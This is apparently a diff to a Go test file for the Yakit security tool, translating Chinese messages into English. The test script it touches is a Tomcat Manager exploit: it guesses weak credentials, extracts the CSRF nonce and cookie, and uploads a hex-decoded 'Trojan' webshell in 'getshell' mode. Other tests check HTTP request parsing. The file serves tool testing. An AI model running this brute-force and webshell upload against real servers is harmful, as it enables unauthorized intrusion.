@@ -9,8 +9,8 @@ yakit.AutoInitYakit()
 
 url = "http://cybertunnel.run:8080"
 if url == ""{
-    yakit.Error("目标url为空")
-    log.error("目标url为空")
+    yakit.Error("The target url is empty")
+    log.error("The target url is empty")
     return
 }
 getshell = true
@@ -112,20 +112,20 @@ getUserPwd = func(url){
             time.sleep(1)
             rsp1,req1,err1 = login(url,userpass)
             if err != nil {
-                yakit.Error("登录数据包发送失败!")
-                log.error("登录数据包发送失败!")
+                yakit.Error("Login packet sending failed!")
+                log.error("Login packet sending failed!")
                 yakit.SetProgress(1)
                 die(err)
             }
             if str.MatchAllOfSubString(rsp1, "Tomcat Web Application Manager"){
-                // yakit.Info("登录成功!存在弱口令漏洞,账号:密码为 %v 若需要进一步利用请开启相关模式! ",up)
-                // log.info("登录成功!存在弱口令漏洞,账号:密码为 %v 若需要进一步利用请开启相关模式! ",up)
+                // yakit.Info("Login successful! There is a weak password vulnerability, account: password is %v If you need further use, please enable the relevant mode! ",up)
+                // log.info("Login successful! There is a weak password vulnerability, account: password is %v If you need further use, please enable the relevant mode! ",up)
                 // yakit.SetProgress(1)
                 return up,rsp1
             }  else {
                     num +=1
-                    yakit.Error("用户或密码错误,进行第 %v 次尝试",num)
-                    log.error("用户或密码错误,进行第 %v 次尝试",num)
+                    yakit.Error("Incorrect user or password, make the %vth attempt",num)
+                    log.error("Incorrect user or password, make the %vth attempt",num)
             }
         }
     }
@@ -135,13 +135,13 @@ getUserPwd = func(url){
 switch {
 
     case getshell:
-        yakit.Info("getshell模式")
-        log.info("getshell模式")
+        yakit.Info("getshell mode")
+        log.info("getshell mode")
         yakit.SetProgress(0.3)
         userpass,rsp = getUserPwd(url)
         if err != nil {
-            yakit.Error("登录数据包发送失败!")
-            log.error("登录数据包发送失败!")
+            yakit.Error("Login packet sending failed!")
+            log.error("Login packet sending failed!")
             yakit.SetProgress(1)
             die(err)
         }
@@ -150,18 +150,18 @@ switch {
         if str.MatchAllOfSubString(rsp, "Tomcat Web Application Manager"){
             // r,_ = re.Compile(` + "`" + `<form\s+method="POST"\s+action="/manager/html/upload(.*?)org.apache.catalina.filters.CSRF_NONCE=(.*?)"` + "`" + `)
             r,_ = re.Compile(` + "`" + `<form\s+method="post"\s+action="/manager/html/upload;(.*?)\?org.apache.catalina.filters.CSRF_NONCE=(.*?)"` + "`" + `)
-            cookie = r.FindAllStringSubmatch(string(body),-1)[0][1] //获取cookie
-            token = r.FindAllStringSubmatch(string(body),-1)[0][2] //获取token
-            //生成随机文件名
+            cookie = r.FindAllStringSubmatch(string(body),-1)[0][1] //Get cookie
+            token = r.FindAllStringSubmatch(string(body),-1)[0][2] //Get token
+            //Generate random file name
             fstr = randstr(8)
-            //解码payload
+            //Decode payload
             payload1,_ = codec.DecodeHex(payload)
             payload2 = string(payload1)
-            //base64编码用户名密码
+            //base64 encoded username and password
             cuserpass = codec.EncodeBase64(userpass)
-            //cooki全部大写
+            //cookie all caps
             cookie = str.ToUpper(cookie)
-            //上传木马
+            //Upload Trojan
             rsp1,req1,err1 = uploadShell(url,cuserpass,cookie,token,payload2,fstr)
 
             headers1,body1 = str.SplitHTTPHeadersAndBodyFromPacket(rsp1)
@@ -173,19 +173,19 @@ switch {
 
 
     default:
-        yakit.Info("POC模式")
-        log.info("POC模式")
-        yakit.Info("获取参数")
-        log.info("获取参数")
+        yakit.Info("POC mode")
+        log.info("POC mode")
+        yakit.Info("Get parameters")
+        log.info("Get parameters")
         yakit.SetProgress(0.3)
         res,rsp = getUserPwd(url)
         if res != ""{
-                yakit.Info("登录成功!存在弱口令漏洞,账号,密码为 %v 若需要进一步利用请开启相关模式! ",res)
-                log.info("登录成功!存在弱口令漏洞,账号,密码为 %v 若需要进一步利用请开启相关模式! ",res)
+                yakit.Info("Login successful! There is a weak password vulnerability, account, The password is %v. If you need further use, please enable the relevant mode! ",res)
+                log.info("Login successful! There is a weak password vulnerability, account, The password is %v. If you need further use, please enable the relevant mode! ",res)
                 yakit.SetProgress(1)
         } else {
-            yakit.Error("或许不存在弱口令漏洞")
-            log.error("或许不存在弱口令漏洞")
+            yakit.Error("Maybe there is no weak password vulnerability")
+            log.error("Maybe there is no weak password vulnerability")
             yakit.SetProgress(1)
         }
 }`
@@ -193,27 +193,27 @@ switch {
 func TestMisc_YAKIT_TOMCAT8(t *testing.T) {
 	cases := []YakTestCase{
 		{
-			Name: "测试 yakit. poc.HTTP Tomcat8",
+			Name: "test yakit. poc.HTTP Tomcat8",
 			Src:  _TOMCAT8_UPLOAD_ORIGIN,
 		},
 	}
 
-	Run("yakit.poc.HTTP Tomcat8 可用性测试", t, cases...)
+	Run("yakit.poc.HTTP Tomcat8 Usability test", t, cases...)
 }
 
 func TestMisc_PoC(t *testing.T) {
 	cases := []YakTestCase{
 		{
-			Name: "测试 yakit. poc.HTTP invalid HTTP BadURL (1)",
+			Name: "test yakit. poc.HTTP invalid HTTP BadURL (1)",
 			Src:  `e = poc.HTTP("GET test HTTP/1.1\r\nHost: www.baidu.com\r\n\r\n")[2];die(e)`,
 		},
 		{
-			Name: "测试 yakit. poc.HTTP invalid HTTP BadURL (2)",
+			Name: "Test yakit. poc.HTTP invalid HTTP BadURL (2)",
 			Src:  `e = poc.HTTP("GET /%%32 HTTP/1.1\r\nHost: www.baidu.com\r\n\r\n")[2];die(e)`,
 		},
 	}
 
-	Run("yakit.poc.HTTP GET Parse HTTP/1.1 可用性测试", t, cases...)
+	Run("yakit.poc.HTTP GET Parse HTTP/1.1 Usability test", t, cases...)
 }
 
 /*
@@ -223,14 +223,14 @@ func TestMisc_PoC(t *testing.T) {
 func TestMisc_PoC_FixRequest(t *testing.T) {
 	cases := []YakTestCase{
 		{
-			Name: "测试 yakit. poc.HTTP invalid HTTP multipart/form-data (1)",
+			Name: "Test yakit. poc.HTTP invalid HTTP multipart/form-data (1)",
 			Src:  `req = poc.FixHTTPRequest([]byte("POST /111 HTTP/1.1\r\nContent-Type: multipart/form-data;\r\nHost: example.com\r\n\r\n{111"));if(!str.MatchAllOfSubString(req, "{111")){die(1)}`,
 		},
 		{
-			Name: "测试 yakit. poc.HTTP invalid HTTP multipart/form-data (1)",
+			Name: "Test yakit. poc.HTTP invalid HTTP multipart/form-data (1)",
 			Src:  `req = poc.FixHTTPRequest([]byte("POST /111 HTTP/1.1\r\nContent-Type: multipart/form-data; boundary=--123123123\r\nHost: example.com\r\n\r\n{111"));if(str.MatchAllOfSubString(req, "{111")){die(1)};println(string(req))`,
 		},
 	}
 
-	Run("yakit.poc.HTTP GET Parse Fix Multipart HTTP/1.1 可用性测试", t, cases...)
+	Run("yakit.poc.HTTP GET Parse Fix Multipart HTTP/1.1 Usability test", t, cases...)
 }
